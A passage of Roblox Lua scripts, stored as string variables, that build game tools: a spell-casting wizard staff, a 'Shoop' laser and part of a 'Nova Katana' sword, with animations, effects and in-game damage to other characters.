function __onUnequipped(mouse)
        Equipped = false
        pcall(function()
                p.Fire:Destroy()
        end)
        pcall(function()
                char['Right Arm']['Wizard staff weld']:Destroy()
        end)
end
function __Shoot()
        if Regening == true then return end
        if Energy < 5 then return end
    shooting = true
    Energy = Energy - 5
    humanoid.WalkSpeed = 0
        local speed = math.random(400,500)
        local bullet = Instance.new("Part",workspace)
        bullet.Name = 'Bullet'
        bullet.TopSurface = 0
        bullet.BottomSurface = 0
        bullet.FormFactor = 'Custom'
        bullet.CFrame = p.CFrame
        bullet.CanCollide = false
        bullet.Velocity = __getVelocity(bullet.Position, mouse.Hit.p, speed)
        local bulletmesh = Instance.new("SpecialMesh",bullet)
        bulletmesh.MeshId = 'http://www.roblox.com/asset/?id=24388358'
        bulletmesh.TextureId = 'http://www.roblox.com/asset/?id=24388341'
        bulletmesh.VertexColor = Vector3.new(0,0,0)
        bullet.Touched:connect(function(toucher)
                if toucher.Parent:findFirstChild'Head' and toucher.Parent:findFirstChild'Torso' and toucher.Parent.Name ~= LocalPlayer.Name then
                        for i,v in pairs(toucher.Parent:children()) do
                                if v.ClassName == 'Humanoid' then
                                        if v.Health > 100 then
                                                v.Health = 100
                                        else
                                                v.Health = v.Health - speed/50
                                        end
                                end
                        end
                        bullet:Destroy()
                end
    end)
    wait(1)
        shooting = false
        humanoid.WalkSpeed = 16
end
function __FireBall()
        if Regening == true then return end
        if Energy < 50 then return end
        if FireBall == true then return end
        Energy = Energy - 50
        local a = Instance.new("Part",workspace)
        a.Anchored = true
        a.CFrame = LocalPlayer.Character.Torso.CFrame * CFrame.new(0,0,-5)
        a.FormFactor = 'Custom'
        a.Size = Vector3.new(5,5,5)
        Instance.new("SpecialMesh", a).MeshType = 'Sphere'
        local b = Instance.new('Decal',a)
        b.Texture = 'http://www.roblox.com/asset/?id=58278973'
        b.Face = 'Right'
        local c = Instance.new('Decal',a)
        c.Texture = 'http://www.roblox.com/asset/?id=58278973'
        c.Face = 'Left'
        local d = Instance.new('Decal',a)
        d.Texture = 'http://www.roblox.com/asset/?id=58278973'
        d.Face = 'Top'
        local e = Instance.new('Decal',a)
        e.Texture = 'http://www.roblox.com/asset/?id=58278973'
        e.Face = 'Front'
        local f = Instance.new('Decal',a)
        f.Texture = 'http://www.roblox.com/asset/?id=58278973'
        f.Face = 'Back'
        local g = Instance.new('Decal',a)
        g.Texture = 'http://www.roblox.com/asset/?id=58278973'
        g.Face = 'Bottom'
        local x = Instance.new('Fire',a)
        x.Size = 20
        local con = a.Touched:connect(function(what)
                if what.Parent.Name ~= LocalPlayer.Name then
                        if what.Parent:findFirstChild'Torso' and what.Parent:findFirstChild'Head' then
                                what:Destroy()
                        end
                end
        end)
        coroutine.wrap(function()
                FireBall = true
                humanoid.WalkSpeed = 0
                for i = 0,1,0.05 do
                        a.Mesh.Scale = Vector3.new(i,i,i)
                        wait()
                end
                FireBall = false
                humanoid.WalkSpeed = 16
                while wait() do
                        if a == nil or a.Parent ~= workspace then break end
                        a.CFrame = a.CFrame * CFrame.new(0,0,-1)
                end
                con:disconnect()
        end)()
        coroutine.wrap(function()
                wait(5)
                Instance.new("Explosion",workspace).Position = a.Position
                a:Destroy()
        end)()
end
function __Spikes()
        if Regening == true then return end
        if Energy < 25 then return end
        if Spikes == true then return end
        Energy = Energy - 25
        Spikes = true
        humanoid.WalkSpeed = 0
        for z = 0,6 do
                local a = Instance.new("Part",workspace)
                a.FormFactor = 'Custom'
                a.Size = Vector3.new(2.4, 3.4, 2.4)
                a.Anchored = true
                local b = Instance.new("SpecialMesh",a)
                b.MeshId = 'http://www.roblox.com/asset/?id=1033714'
                b.TextureId = 'http://www.roblox.com/asset?id=39251676'
                b.VertexColor = Vector3.new(1, 1, 1)
                b.Scale = Vector3.new(1.2, 5.4, 1.2)
                a.CFrame = LocalPlayer.Character.Torso.CFrame * CFrame.new(0,-0.5,-(z*4)-2)
                local con = a.Touched:connect(function(what)
                        if what.Parent.Name ~= LocalPlayer.Name then
                                if what.Parent:findFirstChild'Torso' and what.Parent:findFirstChild'Head' then
                                        for i,v in pairs(what.Parent:children()) do
                                                if v.ClassName == 'Humanoid' then
                                                        if v.Health > 100 then v.Health = 100 end
                                                        v.Health = v.Health - 10
                                                end
                                        end
                                end
                        end
                end)
                coroutine.wrap(function()
                        wait(3)
                        a:Destroy()
                        con:disconnect()
                end)()
                wait()
        end
        humanoid.WalkSpeed = 16
        Spikes = false
end
function __Lightning()
        if Energy < 40 then return end
        if Lightning == true then return end
        if Regening == true then return end
        humanoid.WalkSpeed = 0
        Lightning = true
        Energy = Energy - 40
        local function segment(pos1,pos2,color)
                local dis=(pos1-pos2).magnitude
                local p=Instance.new("Part")
                p.CanCollide=false
                p.FormFactor="Custom"
                p.Size=Vector3.new(.2,.2,dis)
                p.Anchored=true
                p.CFrame=CFrame.new(pos1,pos2)*CFrame.new(0,0,-dis/2)
                p.BrickColor=color
                return p
        end
        target = mouse.Hit
        height=200
        prev=(target*CFrame.new(0,300,0)).p
        for i=height,30,-50 do
                cur=Vector3.new(math.random(15)+target.x,i,math.random(15)+target.z)
                p=segment(prev,cur,BrickColor.new("New Yeller"))
                p.Parent=workspace
                game:service("Debris"):AddItem(p,3)
                prev=cur
                wait()
        end
        p=segment(prev,target.p,BrickColor.new("New Yeller"))
        p.Parent=workspace
        game:service("Debris"):AddItem(p,3)
        Instance.new("Explosion",workspace).Position=target.p
        wait(1)
        Lightning = false
        humanoid.WalkSpeed = 16
end
function __ManaExplosion()
        if Energy < 100 then return end
        if ManaExplosion == true then return end
        if Regening == true then return end
        humanoid.WalkSpeed = 0
        ManaExplosion = true
        Energy = Energy - 100
        local Fire = Instance.new("Fire",LocalPlayer.Character.Torso)
        for i = 0,100 do
                Fire.Size = i
                wait()
        end
        Fire:remove()
        local a = Instance.new("Explosion", LocalPlayer.Character)
        a.Position = LocalPlayer.Character.Torso.Position
        a.BlastPressure = 1e100
        a.BlastRadius = 1e100
        ManaExplosion = false
        humanoid.WalkSpeed = 16
end
t.Activated:connect(__onActivated)
t.Deactivated:connect(__onDeactivated)
t.Equipped:connect(__onEquipped)
t.Unequipped:connect(__onUnequipped)
coroutine.wrap(function()
        while wait() do
                if Activated == true then
                        if Mode == 'Shoot' then
                                __Shoot()
                        elseif Mode == 'FireBall' then
                                __FireBall()
                        elseif Mode == 'Spikes' then
                                __Spikes()
                        elseif Mode == 'Lightning' then
                                __Lightning()
                        elseif Mode == 'ManaExplosion' then
                                __ManaExplosion()
                        end
                end
                if Regening == true then
                        Energy = Energy + 5
                        wait(1)
                end
        end
end)()
mouse.KeyDown:connect(function(key)
        if key == 'r' then
                humanoid.WalkSpeed = 0
                Regening = true
        end
        if key == 'c' then
                if Mode == 'Shoot' then
                        Mode = 'FireBall'
                elseif Mode == 'FireBall' then
                        Mode = 'Spikes'
                elseif Mode == 'Spikes' then
                        Mode = 'Lightning'
                elseif Mode == 'Lightning' then
                        Mode = 'ManaExplosion'
                else
                        Mode = 'Shoot'
                end
        end
end)
mouse.KeyUp:connect(function(key)
        if key == 'r' then
                humanoid.WalkSpeed = 16
                Regening = false
        end
end)
count = 0
countspeed = 0.70
coroutine.wrap(function()
        while wait() do
                if Energy > 100 then Energy = 100 end
                if Energy < 0 then Energy = 0 end
                TEXTLABEL.Text = "Mana: "..tostring(Energy)
                TEXTLABEL2.Text = "Health: "..tostring(math.floor(humanoid.Health))
                if Mode == 'Shoot' then
                        TEXTLABEL3.Text = 'Spell: Star shoot (5 mana)'
                elseif Mode == 'FireBall' then
                        TEXTLABEL3.Text = 'Spell: Fire ball (50 mana)'
                elseif Mode == 'Spikes' then
                        TEXTLABEL3.Text = 'Spell: Spikes row (25 mana)'
                elseif Mode == 'Lightning' then
                        TEXTLABEL3.Text = 'Spell: Lightning (40 mana)'
                elseif Mode == 'ManaExplosion' then
                        TEXTLABEL3.Text = 'Spell: Mana explosion (100 mana) *KILLS EVERYTHING*'
                end
                count = (count % 100) + countspeed
                angle = math.pi * math.sin(math.pi*2/100*count)
                if Vector3.new(0, torso.Velocity.y, 0).magnitude > 2 then
                        countspeed = 8
                        if Equipped == false then
                                rm.C0 = rsc0 * CFrame.Angles(math.rad(150), 0, math.rad(0))
                        else
                                rm.C0 = rsc0 * CFrame.Angles(math.rad(90),0,0)
                        end
                        lm.C0 = lsc0 * CFrame.Angles(math.rad(150), 0, math.rad(0))
                        rlegm.C0 = rlc0 * CFrame.Angles(math.rad(-10) + (-angle*0.05), 0, 0)
                        llegm.C0 = llc0 * CFrame.Angles(math.rad(-10) + (-angle*0.05), 0, 0)
                        neck.C0 = neckc0 * CFrame.Angles(math.rad(-10) + (-angle*0.05),0,0)
                        rootpart.RootJoint.C0 = rootc0 * CFrame.Angles(0,0,0)
                        wait()
                elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude < 2 then --stand
                    if shooting then
                        countspeed = 8
                        rj.C0 = rootc0 * CFrame.Angles(0,0,math.rad(25))
                        rlegm.C0 = rlc0 * CFrame.Angles(math.rad(5), -math.rad(25), 0) --right leg
                                llegm.C0 = llc0 * CFrame.Angles(-math.rad(5), -math.rad(25), -0) --left leg
                                lm.C0 = lsc0 * CFrame.Angles(-math.rad(30), 0, -math.rad(25)) --left arm
                                rm.C0 = rsc0 * CFrame.Angles(math.rad(90)+angle*0.050, 0, 0) --right arm
                        elseif Regening == true then
                                if Energy == 100 then Regening = false end
                                rj.C0 = rootc0 * CFrame.Angles(0,0,0)
                                llegm.C0 = llc0 * CFrame.Angles(0,0,math.rad(-15))
                                rlegm.C0 = rlc0 * CFrame.Angles(0,0,math.rad(15))
                                lm.C0 = lsc0 * CFrame.new(0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(20))
                                rm.C0 = rsc0 * CFrame.new(-0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(-20))
                                neck.C0 = neckc0 * CFrame.Angles(math.rad(15),0,0)
                        elseif FireBall == true then
                                rj.C0 = rootc0 * CFrame.Angles(0,0,0)
                                llegm.C0 = llc0 * CFrame.Angles(0,0,math.rad(-15))
                                rlegm.C0 = rlc0 * CFrame.Angles(0,0,math.rad(15))
                                lm.C0 = lsc0 * CFrame.new(0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(10))
                                rm.C0 = rsc0 * CFrame.new(-0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(-10))
                                neck.C0 = neckc0 * CFrame.Angles(math.rad(15),0,0)
                        elseif Spikes == true then
                                rj.C0 = rootc0 * CFrame.Angles(0,0,0)
                                llegm.C0 = llc0 * CFrame.Angles(0,0,math.rad(-15))
                                rlegm.C0 = rlc0 * CFrame.Angles(0,0,math.rad(15))
                                lm.C0 = lsc0 * CFrame.new(0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(10))
                                rm.C0 = rsc0 * CFrame.new(-0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(-10))
                                neck.C0 = neckc0 * CFrame.Angles(math.rad(15),0,0)
                        elseif Lightning == true then
                                rj.C0 = rootc0 * CFrame.Angles(0,0,0)
                                llegm.C0 = llc0 * CFrame.Angles(0,0,math.rad(-15))
                                rlegm.C0 = rlc0 * CFrame.Angles(0,0,math.rad(15))
                                lm.C0 = lsc0 * CFrame.new(0.5,0,0) * CFrame.Angles(math.rad(120),0,math.rad(10))
                                rm.C0 = rsc0 * CFrame.new(-0.5,0,0) * CFrame.Angles(math.rad(120),0,math.rad(-10))
                                neck.C0 = neckc0 * CFrame.Angles(math.rad(-15),0,0)
                        elseif ManaExplosion == true then
                                coroutine.wrap(function()
                                        for i = 0,360 do
                                                rj.C0 = rootc0 * CFrame.Angles(0,0,0)
                                                wait()
                                        end
                                end)()
                                llegm.C0 = llc0 * CFrame.Angles(0,0,math.rad(-15))
                                rlegm.C0 = rlc0 * CFrame.Angles(0,0,math.rad(15))
                                lm.C0 = lsc0 * CFrame.new(0.5,0,0) * CFrame.Angles(math.rad(120),0,math.rad(10))
                                rm.C0 = rsc0 * CFrame.new(-0.5,0,0) * CFrame.Angles(math.rad(120),0,math.rad(-10))
                                neck.C0 = neckc0 * CFrame.Angles(math.rad(-15),0,0)
                else
                                countspeed = 0.70-- this judges how fast idle animation goes
                                rlegm.C0 = rlc0 * CFrame.Angles(0, 0, 0) --right leg
                                llegm.C0 = llc0 * CFrame.Angles(0, 0, -0) --left leg
                                lm.C0 = lsc0 * CFrame.Angles(-angle*0.050, 0, 0) --left arm
                                if Equipped == false then
                                        rm.C0 = rsc0 * CFrame.Angles(angle*0.050, 0, 0) --right arm
                                else
                                        rm.C0 = rsc0 * CFrame.Angles(math.rad(90),0,0)
                                end
                                neck.C0 = neckc0 * CFrame.Angles(-angle*0.025, 0, 0) --head
                                rj.C0 = rootc0 * CFrame.Angles(-math.rad(1), 0, 0) --torso
                        end
                elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude > 2 then-- walk
                        countspeed = 8-- this judges how fast the walk animation goes
                        rlegm.C0 = rlc0 * CFrame.Angles(-angle*0.100, 0, 0)
                        llegm.C0 = llc0 * CFrame.Angles(angle*0.100, 0, 0)
                        neck.C0 = neckc0 * CFrame.Angles(0, 0, 0)
                        lm.C0 = lsc0 * CFrame.Angles(-angle*0.100, 0, 0)
                        if Equipped == false then
                                rm.C0 = rsc0 * CFrame.Angles(angle*0.100, 0, 0)
                        else
                                rm.C0 = rsc0 * CFrame.Angles(math.rad(90),0,0)
                        end
                        rj.C0 = rootc0 * CFrame.Angles(0, 0, 0)
                end
        end
end)()
]]
 
 Shoop = [[
me = game.Players.LocalPlayer
if script.Parent.className ~= "HopperBin" then
h = Instance.new("HopperBin",me.Backpack)
h.Name = "Z7M, or P7N Gave you Shoop c:"
script.Parent = h
end
bin = script.Parent
function prop(part, parent, collide, tran, ref, x, y, z, color)
part.Parent = parent
part.formFactor = 0
part.CanCollide = collide
part.Transparency = tran
part.Reflectance = ref
part.Size = Vector3.new(x,y,z)
part.BrickColor = BrickColor.new(color)
part.TopSurface = 0
part.BottomSurface = 0
part:BreakJoints()
end
function weld(w, p, p0, p1, a, b, c, x, y, z)
w.Parent = p
w.Part0 = p0
w.Part1 = p1
w.C1 = CFrame.fromEulerAnglesXYZ(a,b,c) * CFrame.new(x,y,z)
end
function mesh(mesh, parent, x, y, z, type)
mesh.Parent = parent
mesh.Scale = Vector3.new(x, y, z)
mesh.MeshType = type
end
using = false
sound = Instance.new("Sound",me.Character.Head)
sound.Volume = 0.6
sound.Pitch = 1
sound.SoundId = "rbxasset://sounds/uuhhh.wav"
bin.Selected:connect(function(mouse)
mouse.Button1Down:connect(function()
if using then return end
using = true
local blagh = Instance.new("Model",me.Character)
blagh.Name = "LAZOR"
local paw = mouse.Hit.p
local pa1 = Instance.new("Part")
prop(pa1,blagh,false,0,0,1,1,1,"Really black")
local m1 = Instance.new("SpecialMesh")
mesh(m1, pa1, 1.07,1,0.3,"Brick")
local w1 = Instance.new("Weld")
weld(w1, me.Character.Head, me.Character.Head, pa1, 0.4, 0, 0, 0, -0.4, 0.9)
local pa2 = pa1:clone()
prop(pa2,blagh,false,0,0,1,1,1,"Really black")
local w2 = Instance.new("Weld")
weld(w2, me.Character.Head, me.Character.Head, pa2, -0.4, 0, 0, 0, 0.4, 0.9)
local pa3 = Instance.new("Part")
prop(pa3,blagh,false,0,0,1,1,1,"Really red")
local m3 = Instance.new("SpecialMesh")
mesh(m3,pa3,1.3,1.23,0.29,"Brick")
local w3 = Instance.new("Weld")
weld(w3, me.Character.Head, me.Character.Head, pa3, 0.4, 0, 0, 0, -0.4, 0.9)
local pa4 = pa3:clone()
prop(pa4,blagh,false,0,0,1,1,1,"Really red")
local w4 = Instance.new("Weld")
weld(w4, me.Character.Head, me.Character.Head, pa4, -0.4, 0, 0, 0, 0.4, 0.9)
local eye1a = Instance.new("Part")
prop(eye1a,blagh,false,0,0,1,1,1,"Institutional white")
eye1a.Shape = "Ball"
local emesh1 = Instance.new("SpecialMesh")
mesh(emesh1,eye1a,0.75,0.75,0.75,"Sphere")
local ew = Instance.new("Weld")
weld(ew, me.Character.Head, me.Character.Head, eye1a, 0, 0, 0, 0.45, -1.3, 1.1)
local eye1b = Instance.new("Part")
prop(eye1b,blagh,false,0,0,1,1,1,"Really black")
eye1b.Shape = "Ball"
local emesh1b = Instance.new("SpecialMesh")
mesh(emesh1b,eye1b,0.4,0.4,0.4,"Sphere")
local ew2 = Instance.new("Weld")
weld(ew2, eye1a, eye1a, eye1b, 0, 0, 0, 0.09, -0.04, 0.2)
local eye2a = eye1a:clone()
prop(eye2a,blagh,false,0,0,1,1,1,"Institutional white")
local ew3 = Instance.new("Weld")
weld(ew3, me.Character.Head, me.Character.Head, eye2a, 0, 0, 0, -0.45, -1.3, 1.1)
local eye2b = eye1b:clone()
prop(eye2b,blagh,false,0,0,1,1,1,"Really black")
local ew5 = Instance.new("Weld")
weld(ew5, eye2a, eye2a, eye2b, 0, 0, 0, -0.05, 0.07, 0.2)
local bill = Instance.new("BillboardGui",pa1)
bill.Adornee = bill.Parent
bill.Size = UDim2.new(0,150,0,80)
local txt = Instance.new("TextLabel",bill)
txt.Size = UDim2.new(0,0,0,0)
txt.Position = UDim2.new(0,100,0,-20)
txt.Text = "IMA FIRIN' MAH LAZORR!!"
txt.FontSize = "Size24"
txt.TextColor3 = Color3.new(0,0,0)
sound.Volume = 0.6
for i=1, 5 do
sound.Pitch = math.random(400,900)/1000
sound:play()
wait(0.1)
end
local bg = Instance.new("BodyGyro",me.Character.Torso)
bg.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
bg.cframe = CFrame.new(me.Character.Torso.Position, paw)
for i=1, 5 do
sound.Pitch = math.random(400,900)/1000
sound:play()
wait(0.2)
end
txt.Text = "BLAARGHH!!!!!!"
sound.Volume = 0.85
for i=1, 60 do
local dist = (me.Character.Head.Position - paw).magnitude
if dist >= 600 then
dist = 600
end
bg.cframe = CFrame.new(me.Character.Torso.Position, paw)
sound.Pitch = math.random(550,750)/1000
sound:play()
local bewm = Instance.new("Part")
prop(bewm, blagh, false, 0.4, 0.25, 1, 1, dist, "Cyan")
bewm.Anchored = true
local mes = Instance.new("SpecialMesh")
mesh(mes,bewm,1.2,1.2,1,"Brick")
bewm.CFrame = CFrame.new(me.Character.Head.Position, paw) * CFrame.new(0,0,-bewm.Size.Z/2) * CFrame.new(0,0,-1)
local luck = math.random(1,3)
if luck == 1 then
local cfr = Instance.new("Part",blagh)
cfr.Size = Vector3.new(1,1,1)
cfr.Transparency = 1
cfr.Anchored = true
cfr.CFrame = bewm.CFrame * CFrame.new(0,0,-bewm.Size.Z/2)
local ex = Instance.new("Explosion")
ex.Parent = blagh
ex.Position = cfr.Position
ex.BlastRadius = 9
ex.BlastPressure = 400000
ex.Hit:connect(function(part)
if part:GetMass() < 240 then
part.Anchored = false
part:BreakJoints()
end
end)
end
wait()
bewm:remove()
end
blagh:remove()
bg:remove()
using = false
end)
end)
]]
 
 
 
 
Test = [[
 for i, v in pairs(game.Players.LocalPlayer.Backpack:children()) do
if v.className == "HopperBin" and v.Name == "Nova Katana" then
v:remove()
end
end
bin = Instance.new("HopperBin")
bin.Name = "Nova Katana"
bin.Parent = game.Players.LocalPlayer.Backpack
local doublesword = true
local doubleclicktime = 0.1
local idledmg = 750
local chargedmg = 1000
if doublesword == true then
idledmg = 3000
chargedmg = 5000
end
local character = game.Players.LocalPlayer.Character
local char = game.Players.LocalPlayer.Character
local HUM = game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
local Torsoz = game.Players.LocalPlayer.Character:findFirstChild("Torso")
local RA = game.Players.LocalPlayer.Character:findFirstChild("Right Arm")
local LA = game.Players.LocalPlayer.Character:findFirstChild("Left Arm")
local H = game.Players.LocalPlayer.Character:findFirstChild("Head")
local RS = Torsoz:findFirstChild("Right Shoulder")
local LS = Torsoz:findFirstChild("Left Shoulder")
local RH = Torsoz:findFirstChild("Right Hip")
local LH = Torsoz:findFirstChild("Left Hip")
local N = Torsoz:findFirstChild("Neck")
local Joint1
local Joint2
local Main
local j
local j2
local Attacking = false
local Charging = false
local Casting = false
local clickval = false
local effectz = false
local rnum = Instance.new("NumberValue")
rnum.Value = math.random()
local efftable = {}
local raytable = {}
chargepitch = 1.7
chargevol = 0.2
local ChargeSwing = Instance.new("Sound", H)
ChargeSwing.SoundId = "http://www.roblox.com/asset/?id=31758934"
ChargeSwing.Pitch = chargepitch
ChargeSwing.Volume = chargevol
summonpitch = 1
summonvol = 1
local Summon = Instance.new("Sound", H)
Summon.SoundId = "http://www.roblox.com/asset/?id=12229501"
Summon.Pitch = summonpitch
Summon.Volume = summonvol
Summon.Looped = false
local HitSound = Instance.new("Sound", H)
HitSound.SoundId = "http://www.roblox.com/asset/?id=130818250"
HitSound.Pitch = 0.6
HitSound.Volume = 0.7
HitSound.Looped = false
local P = Instance.new("Part")
P.Anchored = false
P.CanCollide = false
P.Name = "Part"
P.formFactor = "Custom"
P.Size = Vector3.new(0.5,0.5,0.5)
P.Locked = true
P.TopSurface = 0
P.BottomSurface = 0
function Build()
for i, v in pairs(char:children()) do
if v.className == "Model" and v.Name == "NovaKatana" then
v:remove()
end
end
local mdl = Instance.new("Model", char)
mdl.Name = "NovaKatana"
local h = P:Clone()
h.Name = "Sword"
h.Parent = mdl
h.Size = Vector3.new(1,1,5)
local mesh = Instance.new("SpecialMesh", h)
mesh.Name = "Mesh"
mesh.MeshId = "http://www.roblox.com/asset/?id=74908699"
mesh.TextureId = "http://www.roblox.com/asset/?id=74908713"
mesh.Scale = Vector3.new(0.75,0.75,0.75)
j = h:Clone()
j.Parent = h
j.Size = Vector3.new(0.5,0.5,0.5)
j.Name = "SwordEffect"
j.Transparency = 0.5
local w = Instance.new("Motor", j)
w.Part0 = h
w.Part1 = j
local w = Instance.new("Motor", h)
w.Part0 = Torsoz
w.Part1 = h
w.C0 = CFrame.new(0,0,0.55) * CFrame.Angles(math.pi/2,0,math.pi)
w.C0 = w.C0 * CFrame.Angles(0,math.pi/4,0)
Main = w
if doublesword == true then
local h2 = P:Clone()
h2.Name = "Sword2"
h2.Parent = h
h2.Size = Vector3.new(1,1,5)
local mesh = Instance.new("SpecialMesh", h2)
mesh.MeshId = "http://www.roblox.com/asset/?id=74908699"
mesh.TextureId = "http://www.roblox.com/asset/?id=74908713"
mesh.Scale = Vector3.new(0.75,0.75,0.75)
j2 = h2:Clone()
j2.Parent = h2
j2.Size = Vector3.new(0.5,0.5,0.5)
j2.Name = "SwordEffect2"
j2.Transparency = 0.2
local w = Instance.new("Motor", j2)
w.Part0 = h2
w.Part1 = j2
local w = Instance.new("Motor", h2)
w.Part0 = h
w.Part1 = h2
w.C0 = CFrame.new(0,0,-3.25) * CFrame.Angles(0,-math.pi,0)
end
end
Build()
function Click(num)
if clickval == true then
wait()
clickval = false
else
clickval = true
wait(doubleclicktime)
clickval = false
end
end
function ChargeAttack(mouse, speed)
Charging = true
local p = Joint1.Parent
Joint1:remove()
Joint1 = Instance.new("Motor", p)
Joint1.Part0 = Torsoz
Joint1.Part1 = p
Joint1.C0 = CFrame.new(1.5,0.5,0)
Instance.new("ForceField", char)
local rnumz = rnum.Value
local jointz = Joint1
local con = Main.Parent.Touched:connect(function(hit)
if hit.Parent:findFirstChild("Humanoid") ~= nil and hit.Parent.Name ~= char.Name then
char.ForceField:Remove()
HitSound:Stop()
hit.Parent.Humanoid:TakeDamage(chargedmg)
HitSound:Play()
end
end)
local con2 = nil
if doublesword == true then
con2 = Main.Parent.Sword2.Touched:connect(function(hit)
if hit.Parent:findFirstChild("Humanoid") ~= nil and hit.Parent.Name ~= char.Name then
hit.Parent.Humanoid:TakeDamage(chargedmg)
end
end)
end
wait()
Attacking = true
Torsoz.CFrame = CFrame.new(Torsoz.Position, Vector3.new(mouse.Hit.x,Torsoz.Position.y,mouse.Hit.z))
local bv = Instance.new("BodyVelocity", Torsoz)
bv.maxForce = Vector3.new(math.huge,0,math.huge)
bv.velocity = CFrame.new(Torsoz.Position, Vector3.new(mouse.Hit.x,Torsoz.Position.y,mouse.Hit.z)).lookVector * speed
local bg = Instance.new("BodyGyro", Torsoz)
bg.maxTorque = Vector3.new(math.huge,0,math.huge)
bg.cframe = CFrame.new(Torsoz.Position, Vector3.new(mouse.Hit.x,Torsoz.Position.y,mouse.Hit.z))
bg.D = 100
effectz = true
for _ = 1, 1 do
jointz.C0 = CFrame.new(1.35,0.5,0) * CFrame.Angles(0,0,-math.pi/3)
jointz.C0 = jointz.C0 * CFrame.Angles(math.pi/1.1,0,0)
ChargeSwing.Pitch = chargepitch
ChargeSwing.Volume = chargevol
ChargeSwing:Play()
for i = 1, 13 do
ChargeSwing.Pitch = ChargeSwing.Pitch - 0.045
ChargeSwing.Volume = ChargeSwing.Volume + 0.1
jointz.C0 = jointz.C0 * CFrame.Angles(-(math.pi/1.1)/13,0,0)
wait()
end
jointz.C0 = CFrame.new(1.25,0.5,0) * CFrame.Angles(0,0,math.pi/3)
jointz.C0 = jointz.C0 * CFrame.Angles(math.pi/1.3,0,0)
ChargeSwing.Pitch = chargepitch
ChargeSwing.Volume = chargevol
ChargeSwing:Play()
for i = 1, 13 do
ChargeSwing.Pitch = ChargeSwing.Pitch - 0.045
ChargeSwing.Volume = ChargeSwing.Volume + 0.1
jointz.C0 = jointz.C0 * CFrame.Angles(-(math.pi*1.15)/13,0,0)
wait()
end
end
HUM.PlatformStand = false
con:disconnect()
if con2 ~= nil then
con2:disconnect()
end
bv:Destroy()
bg:Destroy()
jointz.C0 = CFrame.new(1.5,0.5,0) * CFrame.Angles(math.pi/2.4,0,0)
wait()
ChargeSwing.Pitch = chargepitch
ChargeSwing.Volume = chargevol
Attacking = false
Charging = false
effectz = false
end
function IdleAttack()
effectz = true
local numz = rnum.Value
local jointz = Joint1
local con = Main.Parent.Touched:connect(function(hit)
if hit.Parent:findFirstChild("Humanoid") ~= nil and hit.Parent.Name ~= char.Name then
HitSound:Stop()
hit.Parent.Humanoid:TakeDamage(idledmg)
HitSound:Play()
end
end)
local con2 = nil
if doublesword == true then
con2 = Main.Parent.Sword2.Touched:connect(function(hit)
if hit.Parent:findFirstChild("Humanoid") ~= nil and hit.Parent.Name ~= char.Name then
hit.Parent.Humanoid:TakeDamage(idledmg)
end
end)
end
Attacking = true
jointz.C0 = CFrame.new(1.25,0.5,0) * CFrame.Angles(0,0,math.pi/3)
jointz.C0 = jointz.C0 * CFrame.Angles(math.pi/1.3,0,0)
ChargeSwing.Pitch = chargepitch
ChargeSwing.Volume = chargevol
ChargeSwing:Play()
for i = 1, 16 do
if rnum.Value ~= numz then
ChargeSwing:Stop()
break
end
ChargeSwing.Pitch = ChargeSwing.Pitch - 0.045
ChargeSwing.Volume = ChargeSwing.Volume + 0.1
jointz.C0 = jointz.C0 * CFrame.Angles(-(math.pi*1.15)/16,0,0)
wait()
end
HUM.PlatformStand = false
con:disconnect()
if con2 ~= nil then
con2:disconnect()
end
jointz.C0 = CFrame.new(1.5,0.5,0) * CFrame.Angles(math.pi/2.4,0,0)
ChargeSwing.Pitch = chargepitch
ChargeSwing.Volume = chargevol
Attacking = false
effectz = false
end
function onButton1Down(mouse)
if Charging == false and Casting == false then
if clickval == true then
rnum.Value = math.random()
coroutine.resume(coroutine.create(ChargeAttack), mouse, 40)
else
if Attacking == false then
coroutine.resume(coroutine.create(IdleAttack))
end
end
end
coroutine.resume(coroutine.create(Click), rnum.Value)
end
function SwordThrow(mouse)
Instance.new("ForceField", char)
local bp = Instance.new("BodyPosition", Torsoz)
bp.maxForce = Vector3.new(math.huge,math.huge,math.huge)
bp.position = Torsoz.Position
local bg = Instance.new("BodyGyro", Torsoz)
bg.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
bg.cframe = CFrame.new(Torsoz.Position, Vector3.new(mouse.Hit.x,Torsoz.Position.y,mouse.Hit.z))
HUM.WalkSpeed = 0
local jointz = Joint1
Casting = true
Torsoz.CFrame = CFrame.new(Torsoz.Position, Vector3.new(mouse.Hit.x,Torsoz.Position.y,mouse.Hit.z))
local tab = {}
for i = 1, 9 do
local s = P:Clone()
s.Name = "SwordSpell"
s.Parent = char
s.Anchored = true
s.Size = Vector3.new(0.5,0.5,0.5)
s.Transparency = 1
if i == 1 then
s.CFrame = Torsoz.CFrame * CFrame.new(-4,-4.5,0) * CFrame.Angles(-math.pi/2,0,0)
elseif i == 2 then
s.CFrame = Torsoz.CFrame * CFrame.new(0,-4.5,-4) * CFrame.Angles(-math.pi/2,0,-math.pi/2)
elseif i == 3 then
s.CFrame = Torsoz.CFrame * CFrame.new(4,-4.5,0) * CFrame.Angles(-math.pi/2,0,math.pi)
elseif i == 4 then
s.CFrame = Torsoz.CFrame * CFrame.new(5,-6,0) * CFrame.Angles(-math.pi/2,0,math.pi)
elseif i == 5 then
s.CFrame = Torsoz.CFrame * CFrame.new(-5,-6,0) * CFrame.Angles(-math.pi/2,0,math.pi)
elseif i == 6 then
s.CFrame = Torsoz.CFrame * CFrame.new(6,-7,0) * CFrame.Angles(-math.pi/2,0,math.pi)
elseif i == 7 then
s.CFrame = Torsoz.CFrame * CFrame.new(-6,-7,0) * CFrame.Angles(-math.pi/2,0,math.pi)
elseif i == 8 then
s.CFrame = Torsoz.CFrame * CFrame.new(6,-8,0) * CFrame.Angles(-math.pi/2,0,math.pi)
elseif i == 9 then
s.CFrame = Torsoz.CFrame * CFrame.new(-6,-8,0) * CFrame.Angles(-math.pi/2,0,math.pi)
end
local mesh = Instance.new("SpecialMesh", s)
mesh.MeshId = "http://www.roblox.com/asset/?id=74908699"
mesh.TextureId = "http://www.roblox.com/asset/?id=74908713"
